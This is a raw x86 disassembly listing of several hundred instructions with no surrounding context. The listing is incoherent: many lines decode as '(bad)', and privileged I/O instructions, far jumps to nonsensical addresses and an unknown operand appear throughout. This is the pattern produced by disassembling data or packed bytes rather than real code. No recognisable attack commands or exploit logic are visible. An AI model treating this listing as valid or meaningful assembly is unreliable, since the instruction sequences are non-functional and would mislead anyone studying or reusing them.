  41fbc3:	call   FWORD PTR [edi]
  41fbc5:	mov    edi,0xc19cc27d
  41fbca:	jns    0x41fbc4
  41fbcc:	push   edi
  41fbcd:	fcom   QWORD PTR [ebx-0x634116f5]
  41fbd3:	retf   
  41fbd4:	(bad)  [ebp-0x2f]
  41fbd7:	xchg   esi,eax
  41fbd8:	and    bh,BYTE PTR [esi]
  41fbda:	cli    
  41fbdb:	scas   eax,DWORD PTR es:[edi]
  41fbdc:	pop    ds
  41fbdd:	and    al,0x8d
  41fbdf:	(bad)  
  41fbe0:	mov    ds:0xf7cf53c5,eax
  41fbe5:	call   0x6aafaba0
  41fbea:	ror    BYTE PTR [ecx-0x72],0xa
  41fbee:	test   al,0x73
  41fbf0:	in     al,0x4d
  41fbf2:	dec    edx
  41fbf3:	aam    0x13
  41fbf5:	imul   ebx,DWORD PTR [edx],0x29
  41fbf8:	push   ds
  41fbf9:	and    ecx,ecx
  41fbfb:	adc    eax,0x59c74ded
  41fc00:	lock scas eax,DWORD PTR es:[edi]
  41fc02:	je     0x41fba5
  41fc04:	adc    al,0x8
  41fc06:	pop    ebp
  41fc07:	(bad)  
  41fc08:	es aam 0xaa
  41fc0b:	bound  ebp,QWORD PTR [edx+0xc]
  41fc0e:	jae    0x41fc64
  41fc10:	dec    bh
  41fc12:	xor    esp,DWORD PTR [ebp-0x5c]
  41fc15:	ds xor al,0xd2
  41fc18:	and    esp,DWORD PTR [ecx+0x5d]
  41fc1b:	gs pop ebp
  41fc1d:	sbb    ch,dl
  41fc1f:	xchg   ebx,eax
  41fc20:	sub    DWORD PTR [ebx-0x3],0x82102646
  41fc27:	in     eax,0x8e
  41fc29:	cs inc esp
  41fc2b:	int3   
  41fc2c:	pop    esp
  41fc2d:	retf   0x60a2
  41fc30:	imul   esi,DWORD PTR [esi-0x31f0ac8b],0x20
  41fc37:	ja     0x41fc3c
  41fc39:	push   edi
  41fc3a:	and    BYTE PTR [edi+0x43cd45bd],bh
  41fc40:	xor    ebx,DWORD PTR [ebx]
  41fc42:	and    BYTE PTR [edx],dl
  41fc44:	dec    esi
  41fc45:	in     eax,0x25
  41fc47:	pop    ecx
  41fc48:	shr    BYTE PTR [edx+0x27577563],1
  41fc4e:	xor    eax,0xeeb9dbf4
  41fc53:	xor    edx,eax
  41fc55:	cwde   
  41fc56:	fwait
  41fc57:	cld    
  41fc58:	ficom  WORD PTR [edi+0x73]
  41fc5b:	out    dx,eax
  41fc5c:	hlt    
  41fc5d:	shl    esp,cl
  41fc5f:	into   
  41fc60:	or     esp,eax
  41fc62:	xchg   esp,eax
  41fc63:	add    al,0x92
  41fc66:	iret   
  41fc67:	iret   
  41fc68:	pop    esp
  41fc69:	scas   al,BYTE PTR es:[edi]
  41fc6a:	mov    al,0xfb
  41fc6c:	sar    DWORD PTR [edi+ecx*4-0x50],cl
  41fc70:	hlt    
  41fc71:	jmp    0x89392e27
  41fc76:	adc    al,0x43
  41fc78:	add    eax,0x98b6563a
  41fc7d:	mov    ebp,0xbd2c80
  41fc82:	bound  ebp,QWORD PTR [ecx]
  41fc84:	nop
  41fc85:	jg     0x41fce4
  41fc87:	sub    bl,BYTE PTR [edi-0x13]
  41fc8a:	data16 jns 0x41fc2e
  41fc8d:	lods   eax,DWORD PTR ds:[esi]
  41fc8e:	pop    ss
  41fc8f:	out    0xb9,al
  41fc91:	add    WORD PTR [edi+eax*1],di
  41fc95:	pop    eax
  41fc96:	sub    DWORD PTR [edi],ebx
  41fc98:	inc    ebx
  41fc99:	out    dx,al
  41fc9a:	ret    
  41fc9b:	cmp    ah,0xf2
  41fc9e:	arpl   WORD PTR [esi+0x54],dx
  41fca1:	out    0x17,eax
  41fca3:	lahf   
  41fca4:	mov    al,ds:0x1f4ab304
  41fca9:	outs   dx,BYTE PTR ds:[esi]
  41fcaa:	test   DWORD PTR [edi-0x2fc1e4ca],0xf885ce65
  41fcb4:	adc    dh,BYTE PTR [edx+edi*4]
  41fcb7:	mov    cl,0xde
  41fcb9:	test   eax,0x643abfab
  41fcbe:	ins    DWORD PTR es:[edi],dx
  41fcbf:	inc    edi
  41fcc0:	lods   al,BYTE PTR ds:[esi]
  41fcc1:	lds    edx,FWORD PTR [esi]
  41fcc3:	jmp    0x9954:0xb342abc
  41fcca:	rcl    DWORD PTR [edi-0x28f5ba94],1
  41fcd0:	sub    BYTE PTR [edx+ebx*2],ch
  41fcd3:	push   ebp
  41fcd4:	(bad)  
  41fcd5:	jecxz  0x41fd1a
  41fcd7:	fwait
  41fcd8:	ins    DWORD PTR es:[edi],dx
  41fcd9:	push   ebx
  41fcda:	pop    edi
  41fcdb:	and    BYTE PTR [ebx+0x19e7b9f7],al
  41fce1:	jmp    0xd1c26edc
  41fce6:	(bad)  
  41fce7:	in     eax,dx
  41fce8:	xchg   edx,eax
  41fce9:	jno    0x41fccc
  41fceb:	dec    ebx
  41fcec:	inc    esp
  41fced:	and    DWORD PTR [ebx+edx*1+0x1],edx
  41fcf1:	sbb    eax,0x76624b4f
  41fcf6:	out    0x79,al
  41fcf8:	sar    BYTE PTR [edi],0x6f
  41fcfb:	push   0xb5726843
  41fd00:	aad    0xa2
  41fd02:	sahf   
  41fd03:	iret   
  41fd04:	xor    bl,ah
  41fd06:	leave  
  41fd07:	repz dec edi
  41fd09:	popf   
  41fd0a:	sahf   
  41fd0b:	into   
  41fd0c:	mov    ch,0xfa
  41fd0e:	mov    al,0xe9
  41fd10:	(bad)  
  41fd11:	in     al,0x2f
  41fd13:	test   DWORD PTR [eax],edi
  41fd15:	push   0xffffffe9
  41fd17:	addr16 test eax,0xfad6fe6a
  41fd1d:	sbb    dl,dh
  41fd1f:	lahf   
  41fd20:	and    eax,0x44e00d3b
  41fd25:	mov    al,0x70
  41fd27:	arpl   WORD PTR [ecx-0x639daad3],bp
  41fd2d:	cmp    DWORD PTR [ebx+0x2a305e59],esp
  41fd33:	lock pop ds
  41fd35:	xor    BYTE PTR [ebp+0x38],cl
  41fd38:	jb     0x41fd04
  41fd3a:	xor    ecx,0xbec12c14
  41fd40:	cli    
  41fd41:	imul   ecx,DWORD PTR [ebp+eax*1-0x28],0xffffffe9
  41fd46:	add    BYTE PTR [ebp*4+0x3c6f3bac],dh
  41fd4d:	pusha  
  41fd4e:	(bad)  
  41fd4f:	scas   al,BYTE PTR es:[edi]
  41fd50:	push   DWORD PTR [ebx-0x5d]
  41fd53:	fisub  WORD PTR [esi+ecx*1-0x6716f35e]
  41fd5a:	fistp  QWORD PTR [edx-0x1a]
  41fd5d:	in     al,dx
  41fd5e:	cli    
  41fd5f:	stc    
  41fd60:	sahf   
  41fd61:	dec    edx
  41fd62:	pop    ebp
  41fd63:	call   0xd239919f
  41fd68:	mov    dl,0x6c
  41fd6a:	es mov ecx,0x2602ca90
  41fd70:	iret   
  41fd71:	cs jmp 0x5c21:0xd486dde5
  41fd79:	inc    eax
  41fd7a:	loop   0x41fdd0
  41fd7c:	inc    edx
  41fd7d:	or     ebx,DWORD PTR [edi]
  41fd7f:	mov    edx,0x8f363de7
  41fd84:	inc    ecx
  41fd85:	test   eax,0xc9a28be8
  41fd8a:	xchg   dh,al
  41fd8c:	jno    0x41fd23
  41fd8e:	or     DWORD PTR [ebx-0x68b4a82c],eax
  41fd94:	xor    ecx,DWORD PTR [eax-0x374f59b1]
  41fd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd9b:	xor    esi,ebx
  41fd9d:	mov    ebp,0x16b5f693
  41fda2:	imul   ecx,DWORD PTR [bp+di-0x4e0],0x75
  41fda8:	jo     0x41fe27
  41fdaa:	fsubr  st(2),st
  41fdac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdad:	lods   al,BYTE PTR ds:[esi]
  41fdae:	(bad)
  41fdb1:	lods   eax,DWORD PTR ds:[esi]
  41fdb2:	xchg   esp,eax
  41fdb3:	jnp    0x41fd43
  41fdb5:	mov    ds:0x3f9c751c,eax
  41fdba:	in     al,0x2f
  41fdbc:	xor    BYTE PTR [ecx],bh
  41fdbe:	and    eax,0x13f4501d
  41fdc3:	or     DWORD PTR [ebx],ebp
  41fdc5:	jne    0x41fe12
  41fdc7:	jl     0x41fdcc
  41fdc9:	sub    esi,DWORD PTR [eax+0x3e906c7f]
  41fdcf:	cs (bad) 
  41fdd1:	sub    al,0x35
  41fdd3:	push   ebp
  41fdd4:	out    dx,eax
  41fdd5:	push   0x597d8245
  41fdda:	push   ds
  41fddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fddc:	bnd jns 0x41fe0b
  41fddf:	mov    bh,0xd4
  41fde1:	pop    ebx
  41fde2:	mov    dl,0x50
  41fde4:	leave  
  41fde5:	cmp    al,0x16
  41fde7:	sbb    ebx,esp
  41fde9:	jns    0x41fe14
  41fdeb:	aaa    
  41fdec:	cli    
  41fded:	or     DWORD PTR [ebx+0x30b2bfc0],edx
  41fdf3:	push   cs
  41fdf4:	ss das 
  41fdf6:	add    eax,0x1b44bff6
  41fdfb:	iret   
  41fdfc:	in     eax,0xac
  41fdfe:	fs gs jae 0x41fdda
  41fe02:	sub    BYTE PTR [ebx-0x718802af],ch
  41fe08:	xchg   esp,eax
  41fe09:	and    DWORD PTR [ebp-0x18],0x91f6455
  41fe10:	aad    0x96
  41fe12:	mov    edi,ebp
  41fe14:	mov    edx,0x9a4760b6
  41fe19:	xchg   BYTE PTR [edi+0x7f],bh
  41fe1c:	sbb    ebx,DWORD PTR [ebx+0x54]
  41fe1f:	pop    eax
  41fe20:	retf   
  41fe21:	push   ebp
  41fe22:	or     ebx,DWORD PTR [ecx+0x67e332ee]
  41fe28:	popa   
  41fe29:	das    
  41fe2a:	ja     0x41fdbb
  41fe2c:	mov    dh,0x87
  41fe2e:	xchg   ecx,eax
  41fe2f:	in     eax,dx
  41fe30:	hlt    
  41fe31:	shl    bh,0x9b
  41fe34:	pop    ss
  41fe35:	fisubr WORD PTR [edi+0x7ee3b088]
  41fe3b:	jns    0x41fdbf
  41fe3d:	push   edi
  41fe3e:	inc    eax
  41fe3f:	(bad)  
  41fe40:	nop
  41fe41:	icebp  
  41fe42:	ror    ecx,0x6f
  41fe45:	cmp    cl,BYTE PTR [edi]
  41fe47:	sub    eax,0x306aa0c8
  41fe4c:	sbb    al,0xa7
  41fe4e:	fisub  WORD PTR [ecx-0x16d27cbf]
  41fe54:	lds    edx,FWORD PTR [ebx+eiz*1-0x725b175e]
  41fe5b:	mov    ah,0xee
  41fe5d:	(bad)  
  41fe5e:	mov    ah,0xf5
  41fe60:	jno    0x41fead
  41fe62:	xchg   BYTE PTR [bx-0x4c],al
  41fe66:	jmp    0x6dbb84d4
  41fe6b:	jne    0x41fe03
  41fe6d:	lock pop ds
  41fe6f:	jo     0x41fe3f
  41fe71:	xor    ebx,DWORD PTR ds:0x49eb0f82
  41fe77:	pop    esp
  41fe78:	fstp   DWORD PTR [esi]
  41fe7a:	push   edx
  41fe7b:	ret    
  41fe7c:	gs mov edi,0xb922dd26
  41fe82:	outs   dx,DWORD PTR ds:[esi]
  41fe83:	mov    al,0xc5
  41fe85:	jp     0x41fecd
  41fe87:	adc    bh,bl
  41fe89:	dec    edi
  41fe8a:	push   eax
  41fe8b:	and    BYTE PTR [ecx],bl
  41fe8d:	popa   
  41fe8e:	dec    eax
  41fe8f:	sbb    esi,DWORD PTR [esi-0x15]
  41fe92:	cwde   
  41fe93:	int    0xcb
  41fe95:	fiadd  DWORD PTR [edi]
  41fe97:	add    BYTE PTR [eax+eax*4+0x31],0x44
  41fe9c:	sti    
  41fe9d:	ret    
  41fe9e:	lods   eax,DWORD PTR ds:[esi]
  41fe9f:	mov    ah,0xb4
  41fea1:	and    bl,cl
  41fea3:	ds dec edx
  41fea5:	dec    edx
  41fea6:	adc    BYTE PTR [edx+0x20],bl
  41fea9:	aad    0xb2
  41feab:	fs inc ebx
  41fead:	ds out dx,eax
  41feaf:	and    edi,DWORD PTR [edi]
  41feb1:	pop    ecx
  41feb2:	xor    eax,0xb5d40201
  41feb7:	cmp    BYTE PTR [esi+0x6e],bl
  41feba:	mov    dh,0x61
  41febc:	gs call 0xa8d5379a
  41fec2:	stos   BYTE PTR es:[edi],al
  41fec3:	pusha  
  41fec4:	iret   
  41fec5:	fldcw  WORD PTR [ebx-0x33dba847]
  41fecb:	add    eax,0x59bca527
  41fed0:	dec    edi
  41fed1:	cmp    esp,DWORD PTR [eax]
  41fed3:	pop    edx
  41fed4:	stc    
  41fed5:	jmp    0x41fed9
  41fed7:	ret    
  41fed8:	mov    ds:0x2b2734bc,eax
  41fedd:	outs   dx,DWORD PTR ds:[esi]
  41fede:	mov    dl,0xd9
  41fee0:	sub    edx,DWORD PTR [ecx+0x76ace2a0]
  41fee6:	test   eax,0xc46f5bb6
  41feeb:	sahf   
  41feec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feed:	not    DWORD PTR [esi+0x43]
  41fef0:	or     ebp,DWORD PTR [ebx+ecx*4-0x38]
  41fef4:	not    esp
  41fef6:	sbb    eax,0xf1719eb4
  41fefb:	push   ebp
  41fefc:	in     eax,dx
  41fefd:	pop    esi
  41fefe:	xchg   edi,eax
  41feff:	mov    gs,ebx
  41ff01:	and    al,0xab
  41ff03:	xchg   edx,eax
  41ff04:	inc    ebp
  41ff05:	lds    eax,FWORD PTR [ebx+0x6c526fb7]
  41ff0b:	dec    eax
  41ff0c:	sbb    DWORD PTR [ebp-0x7],0x51
  41ff10:	call   0x2d82:0x9418eba0
  41ff17:	dec    DWORD PTR [ebx+0x62cd5c1]
  41ff1d:	into   
  41ff1e:	xor    al,0x8e
  41ff20:	jecxz  0x41ff03
  41ff22:	loope  0x41ff3b
  41ff24:	ret    
  41ff25:	leave  
  41ff26:	aas    
  41ff27:	fldcw  WORD PTR [esi]
  41ff29:	shl    DWORD PTR [edi],1
  41ff2b:	daa    
  41ff2c:	das    
  41ff2d:	test   BYTE PTR [ebp-0x1fdb8a02],ah
  41ff33:	test   BYTE PTR [edx-0x4b81b8c4],dl
  41ff39:	icebp  
  41ff3a:	rol    BYTE PTR [ecx],cl
  41ff3c:	daa    
  41ff3d:	cmc    
  41ff3e:	add    BYTE PTR [ebp+0x5e034c67],al
  41ff44:	mov    edi,0x2ddb12be
  41ff49:	push   esi
  41ff4a:	cmp    ah,BYTE PTR [edx-0x281c311f]
  41ff50:	mov    BYTE PTR [ebx+0x1a82ee8],cl
  41ff56:	or     ebx,DWORD PTR [ebx]
  41ff58:	adc    DWORD PTR [eax+0x3a],esi
  41ff5b:	sahf   
  41ff5c:	add    DWORD PTR [esi-0x6f],eax
  41ff5f:	pop    ds
  41ff60:	pop    ebx
  41ff61:	out    0x27,eax
  41ff63:	imul   edx
  41ff65:	push   0x37ae6c6b
  41ff6a:	mov    bl,0x3d
  41ff6c:	add    DWORD PTR [edi-0x80],edx
  41ff6f:	add    bl,BYTE PTR [esi-0x312f6525]
  41ff75:	lods   al,BYTE PTR ds:[esi]
  41ff76:	aad    0xb7
  41ff78:	sbb    eax,0x4c22ae94
  41ff7d:	pop    ebp
  41ff7e:	mov    ?,esi
  41ff80:	in     al,0x80
  41ff82:	lods   eax,DWORD PTR ds:[esi]
  41ff83:	ror    edx,cl
  41ff85:	arpl   WORD PTR [ebx+edi*1],di
  41ff88:	out    0xa9,eax
  41ff8a:	arpl   WORD PTR [eax-0x642886bb],ax
  41ff90:	ret    
  41ff91:	sub    ecx,ecx
  41ff93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff94:	mov    ds:0x2f938180,eax
  41ff99:	aad    0x50
  41ff9b:	sbb    bl,cl
  41ff9d:	sub    cl,BYTE PTR [esi]
  41ff9f:	lods   eax,DWORD PTR ds:[esi]
  41ffa0:	daa    
  41ffa1:	in     al,dx
  41ffa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa3:	out    0x31,eax
  41ffa5:	test   DWORD PTR [eax-0xc],esi
  41ffa8:	enter  0x47ac,0xd
  41ffac:	int3   
  41ffad:	ret    0xdf5
  41ffb0:	jl     0x41ff56
  41ffb2:	jge    0x41ff4a
  41ffb4:	test   dh,0x9e
  41ffb7:	mov    edi,0xa91e34a0
  41ffbc:	sub    eax,0xf2b0c384
  41ffc1:	sub    eax,0xda8c7dd
  41ffc6:	adc    ch,dl
  41ffc8:	rcl    BYTE PTR gs:[edi+0x61],0x26
  41ffcd:	inc    esi
  41ffce:	fcomp  DWORD PTR [edx+edi*8]
  41ffd1:	fistp  QWORD PTR [edi+0x720d979]
  41ffd7:	inc    edi
  41ffd8:	xchg   edx,eax
  41ffd9:	loopne 0x420032
  41ffdb:	adc    BYTE PTR [ebx-0x70],al
  41ffde:	loopne 0x42001f
  41ffe0:	ja     0x41ff78
  41ffe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe3:	cmp    dl,bh
  41ffe5:	aad    0x8d
  41ffe7:	and    bl,al
  41ffe9:	mov    BYTE PTR [ebx],dh
  41ffeb:	jns    0x41ffaf
  41ffed:	xor    BYTE PTR [esi-0x64],0x39
  41fff1:	cmp    esi,edx
  41fff3:	mov    ds:0xa94333cd,eax
  41fff8:	inc    esp
  41fff9:	inc    ebp
  41fffa:	outs   dx,DWORD PTR ds:[esi]
  41fffb:	out    0xb0,eax
  41fffd:	jge    0x41ffb6
  41ffff:	xor    dh,BYTE PTR [ecx+0x6f157995]
  420005:	add    eax,0x9fe3620d
  42000a:	jne    0x42004b
  42000c:	pop    es
  42000d:	push   esi
  42000e:	scas   eax,DWORD PTR es:[edi]
  42000f:	jecxz  0x420036
  420011:	pop    ecx
  420012:	mov    bh,0xe3
  420014:	fistp  DWORD PTR [edi-0x304cd4c2]
  42001a:	(bad)  
  42001b:	aas    
  42001c:	jge    0x420087
  42001e:	fisttp WORD PTR [eax]
  420020:	sbb    al,0x2a
  420022:	push   ss
  420023:	in     al,dx
  420024:	nop
  420025:	add    al,0x88
  420027:	imul   ebx,DWORD PTR [ecx-0x75d3d984],0xffffffb6
  42002e:	(bad)  
  42002f:	out    0xb6,eax
  420031:	loope  0x41ffdb
  420033:	sbb    BYTE PTR [edi],0x36
  420036:	inc    eax
  420037:	outs   dx,DWORD PTR ds:[esi]
  420038:	inc    edi
  420039:	rcr    BYTE PTR [edx+0x2dc67de9],0x40
  420040:	stos   BYTE PTR es:[edi],al
  420041:	cli    
  420042:	sbb    eax,DWORD PTR [esp+eax*2-0x5]
  420046:	ret    
  420047:	adc    BYTE PTR [ecx+eiz*1+0x49a01ea0],ch
  42004e:	jle    0x420023
  420050:	jmp    0xcbd3:0x2a56
  420056:	sbb    BYTE PTR [edx],bl
  420058:	push   ebp
  420059:	mov    ds:0x807ba01a,al
  42005e:	out    dx,eax
  42005f:	(bad)  
  420060:	fwait
  420061:	push   ss
  420062:	adc    eax,0xdfd124b8
  420067:	(bad)  
  420068:	icebp  
  420069:	sbb    dh,bl
  42006b:	cdq    
  42006c:	pop    esi
  42006d:	or     eax,0xfb71669
  420072:	dec    edi
  420073:	aad    0x94
  420075:	cmp    BYTE PTR [ecx],bl
  420077:	xchg   edx,eax
  420078:	sub    al,0xca
  42007a:	inc    eax
  42007b:	xchg   ebp,eax
  42007c:	jmp    0x420084
  42007e:	inc    esp
  42007f:	xor    esp,DWORD PTR [edi+0x6e]
  420082:	push   edi
  420083:	inc    edi
  420084:	fcom   DWORD PTR [esi-0x1e840f04]
  42008a:	(bad)  
  42008b:	push   ss
  42008c:	or     eax,0x9c744b90
  420091:	repnz cmp ebx,DWORD PTR [ecx-0x27f70a8e]
  420098:	sub    DWORD PTR [eax-0xd],edi
  42009b:	jnp    0x4200c0
  42009d:	pop    eax
  42009e:	cwde   
  42009f:	jge    0x4200c3
  4200a1:	mov    edi,ds
  4200a3:	fld    DWORD PTR [edx-0x38]
  4200a6:	and    esp,DWORD PTR [esi]
  4200a8:	and    eax,0x5cf94e93
  4200ad:	hlt    
  4200ae:	nop
  4200af:	and    ch,BYTE PTR [edi-0x6f87f60]
  4200b5:	pushf  
  4200b6:	fwait
  4200b7:	pushf  
  4200b8:	test   DWORD PTR [ebx-0x1ac9a9ea],ecx
  4200be:	jg     0x42006b
  4200c0:	add    BYTE PTR [edx-0x1d],ah
  4200c3:	xor    al,0x3f
  4200c5:	lods   eax,DWORD PTR ds:[esi]
  4200c6:	popf   
  4200c7:	push   es
  4200c8:	mov    ah,0xfa
  4200ca:	mov    dl,0x2
  4200cc:	call   FWORD PTR [ebx+eax*1-0x20]
  4200d0:	(bad)  
  4200d3:	jl     0x420108
  4200d5:	mov    esi,0x94bf351
  4200da:	mov    cl,0x30
  4200dc:	sar    BYTE PTR ds:0xa21a641c,1
  4200e2:	cmc    
  4200e3:	and    BYTE PTR [ebp-0x5d23d909],bh
  4200e9:	test   DWORD PTR [edi+0x6c2edfa0],ebx
  4200ef:	mov    cl,0x32
  4200f1:	pop    ss
  4200f2:	cmc    
  4200f3:	(bad)  
  4200f4:	adc    al,0xc3
  4200f6:	retf   
  4200f7:	xor    bl,BYTE PTR [ebp+0x3]
  4200fa:	rcr    DWORD PTR [ecx],cl
  4200fc:	fstp   QWORD PTR [ecx-0x1bbb83da]
  420102:	dec    edx
  420103:	sub    bh,dl
  420105:	xchg   ebx,eax
  420106:	xor    al,0xdf
  420108:	xor    eax,0xcfe7caa4
  42010d:	cmp    bl,BYTE PTR [ebx+0x72]
  420110:	inc    edi
  420111:	(bad)  
  420113:	xor    dl,BYTE PTR [edx-0x19]
  420116:	and    bl,BYTE PTR [edi+0x95f1d2c]
  42011c:	dec    ebx
  42011e:	shr    BYTE PTR [eax-0x60],1
  420121:	mov    ds:0x1c3a786b,al
  420126:	xor    esi,DWORD PTR [edi]
  420128:	fld    TBYTE PTR [ebp+0x4e]
  42012b:	pop    ecx
  42012c:	hlt    
  42012d:	sbb    eax,0xdb63f5fa
  420132:	cmp    eax,0x554b423c
  420137:	loope  0x4200f0
  420139:	sub    DWORD PTR [edi+0x24c089b1],0xb7555afb
  420143:	scas   al,BYTE PTR es:[edi]
  420144:	mov    esp,0xd30f4d67
  420149:	cmp    al,0x3d
  42014b:	enter  0xd880,0x3b
  42014f:	out    dx,eax
  420150:	imul   edi,edi,0x3715cd20
  420156:	hlt    
  420157:	ficom  WORD PTR [edi]
  420159:	std    
  42015a:	xor    ebp,0xffffffa0
  42015d:	fs stos DWORD PTR es:[edi],eax
  42015f:	(bad)  
  420160:	mov    dh,0xa3
  420162:	push   ss
  420163:	retf   
  420164:	mov    bl,0xd8
  420166:	sbb    bl,BYTE PTR [ebx]
  420168:	ficomp WORD PTR [edx+0x4f]
  42016b:	mov    ds:0x3449991c,eax
  420170:	ret    0xd7f1
  420173:	xchg   BYTE PTR [ebx-0x4cdaff1e],bl
  420179:	mov    dl,0xbc
  42017b:	out    0xdb,eax
  42017d:	sub    BYTE PTR [edx+0xd8b0fee],dl
  420183:	repz add BYTE PTR [ebx+0xb352648],al
  42018a:	(bad)  
  42018b:	pop    ss
  42018c:	dec    eax
  42018d:	ins    DWORD PTR es:[edi],dx
  42018e:	xchg   ecx,eax
  42018f:	and    al,0xf1
  420191:	imul   esp,DWORD PTR [esi],0x40
  420194:	das    
  420195:	adc    dh,dl
  420197:	lods   eax,DWORD PTR ds:[esi]
  420198:	and    DWORD PTR [edi+0x479cda4a],edi
  42019e:	jo     0x42012e
  4201a0:	icebp  
  4201a1:	scas   al,BYTE PTR es:[edi]
  4201a2:	lods   al,BYTE PTR ds:[esi]
  4201a3:	or     esi,esi
  4201a5:	or     eax,0xb1e53d34
  4201aa:	loopne 0x4201ce
  4201ac:	div    BYTE PTR [eax+0x23]
  4201af:	test   al,0xa1
  4201b1:	xchg   BYTE PTR [esi+0x36],bh
  4201b4:	and    ebx,edi
  4201b6:	into   
  4201b7:	pop    eax
  4201b8:	jmp    0xd42eb8b0
  4201bd:	mov    dh,0xfc
  4201bf:	js     0x420232
  4201c1:	add    bh,BYTE PTR [esi+0x7d46330e]
  4201c7:	mov    DWORD PTR ds:0x209f9a23,esp
  4201cd:	fldenv [ebx+ebx*4]
  4201d0:	lods   al,BYTE PTR ds:[esi]
  4201d1:	push   ebx
  4201d2:	jns    0x420247
  4201d4:	ja     0x4201a5
  4201d6:	inc    ebx
  4201d7:	xchg   BYTE PTR [ecx+0x7e],dl
  4201da:	icebp  
  4201db:	icebp  
  4201dc:	sbb    DWORD PTR [ecx],ecx
  4201de:	test   DWORD PTR [esi],eax
  4201e0:	arpl   WORD PTR [eax+ebp*8],sp
  4201e3:	fbstp  TBYTE PTR [edx-0x63cf63db]
  4201e9:	cmp    BYTE PTR [edi],dl
  4201eb:	pusha  
  4201ec:	call   0xb342e58
  4201f1:	aad    0x85
  4201f3:	dec    esi
  4201f4:	inc    ecx
  4201f5:	push   ds
  4201f6:	cwde   
  4201f7:	js     0x4201f5
  4201f9:	push   ecx
  4201fa:	cmp    al,0xd7
  4201fc:	les    esi,FWORD PTR [ecx-0x6c]
  4201ff:	mov    ds:0x7c1789d5,al
  420204:	pop    ebx
  420205:	cwde   
  420206:	mov    edx,0xd381dfc9
  42020b:	loopne 0x42019e
  42020d:	sub    DWORD PTR [ebx+0x62],esi
  420210:	(bad)  
  420211:	or     dl,bl
  420213:	dec    esi
  420214:	sub    dl,BYTE PTR [ecx]
  420216:	pop    ds
  420217:	sar    ebx,1
  420219:	mov    al,ds:0x4ccd53
  42021e:	fisttp QWORD PTR [eax]
  420220:	xchg   ebx,eax
  420221:	push   eax
  420222:	lea    esp,[ebx]
  420224:	jmp    0x1ef3:0xea169383
  42022b:	sbb    ch,BYTE PTR [edx]
  42022d:	cwde   
  42022e:	aaa    
  42022f:	sti    
  420230:	mov    ds:0xfb4f9864,eax
  420235:	pop    edx
  420236:	mov    esi,0x256ca19c
  42023b:	jno    0x420285
  42023d:	sti    
  42023e:	icebp  
  42023f:	in     eax,0xe9
  420241:	sub    bh,BYTE PTR [ecx]
  420243:	and    eax,0x22b056a9
  420248:	maxps  xmm4,xmm4
  42024b:	jb     0x42023c
  42024d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42024e:	ficom  WORD PTR [edi]
  420250:	pop    eax
  420251:	ret    
  420252:	mov    ch,0x26
  420254:	pop    ds
  420255:	sbb    eax,0xf6206e8f
  42025a:	pop    eax
  42025b:	aaa    
  42025c:	and    BYTE PTR [edi],dh
  42025e:	hlt    
  42025f:	in     eax,dx
  420260:	add    eax,0xef32965f
  420265:	mov    dh,0xbf
  420267:	sti    
  420268:	adc    al,0x3d
  42026a:	pushf  
  42026b:	gs sahf 
  42026d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42026e:	inc    ebp
  42026f:	or     DWORD PTR [ebx+edi*1+0x43],ebx
  420273:	pop    ebp
  420274:	ins    DWORD PTR es:[edi],dx
  420275:	inc    ecx
  420276:	stos   BYTE PTR es:[edi],al
  420277:	jmp    0x420221
  420279:	cdq    
  42027a:	fsubr  st,st(4)
  42027c:	aam    0xc
  42027e:	xchg   edx,eax
  42027f:	mov    edx,0xf717424f
  420284:	(bad)  
  420285:	icebp  
  420286:	(bad)  
  420287:	(bad)  
  420288:	aaa    
  420289:	jle    0x420271
  42028b:	cs test bl,ah
  42028e:	std    
  42028f:	pop    eax
  420290:	inc    esp
  420291:	enter  0x1d5f,0xfd
  420295:	mov    eax,0x6c3f2594
  42029a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42029b:	cli    
  42029c:	xchg   edi,eax
  42029d:	cmp    al,ch
  42029f:	cmc    
  4202a0:	pop    ecx
  4202a1:	pop    ebx
  4202a3:	adc    al,0x95
  4202a5:	dec    ecx
  4202a6:	data16 and al,0xcc
  4202a9:	xchg   esi,eax
  4202aa:	ds xchg edi,eax
  4202ac:	aaa    
  4202ad:	or     bh,BYTE PTR [ebp-0x11e6b7de]
  4202b3:	adc    ah,al
  4202b5:	outs   dx,BYTE PTR ds:[esi]
  4202b6:	shl    BYTE PTR [eax-0x39],0x16
  4202ba:	sbb    al,0x3d
  4202bc:	xor    BYTE PTR [edx],0x32
  4202bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c0:	pop    eax
  4202c1:	mov    ecx,0x6bb30274
  4202c6:	dec    ecx
  4202c7:	xchg   ebp,eax
  4202c8:	mov    al,ds:0xb8ca22b2
  4202cd:	push   ss
  4202ce:	aam    0xa3
  4202d0:	jg     0xdd819e31
  4202d6:	jo     0x42034e
  4202d8:	stc    
  4202d9:	ret    
  4202da:	scas   al,BYTE PTR es:[edi]
  4202db:	push   edi
  4202dc:	cmp    ecx,DWORD PTR [esi+ecx*8+0x14]
  4202e0:	mov    DWORD PTR [edi+eax*4+0x72],edx
  4202e4:	aad    0x6b
  4202e6:	ds sub al,0xa8
  4202e9:	(bad)  
  4202ea:	dec    BYTE PTR [esi]
  4202ec:	ret    0x683f
  4202ef:	xchg   BYTE PTR [ecx],bh
  4202f1:	jae    0x4202f7
  4202f3:	and    DWORD PTR [eax+0x4cc52fb0],eax
  4202f9:	or     ch,ch
  4202fb:	cvtps2pi mm7,QWORD PTR [edx+0x63]
  4202ff:	lods   al,BYTE PTR ds:[esi]
  420300:	popf   
  420301:	xchg   esi,eax
  420302:	ja     0x42032e
  420304:	pushf  
  420305:	xlat   BYTE PTR ds:[ebx]
  420306:	scas   eax,DWORD PTR es:[edi]
  420307:	fs pop ecx
  420309:	inc    esi
  42030a:	dec    esi
  42030b:	sub    BYTE PTR [edi-0x6ae82428],cl
  420311:	lds    ebx,FWORD PTR [eax]
  420313:	mov    esi,eax
  420315:	test   eax,0x3b488888
  42031a:	xchg   ebp,eax
  42031b:	inc    edi
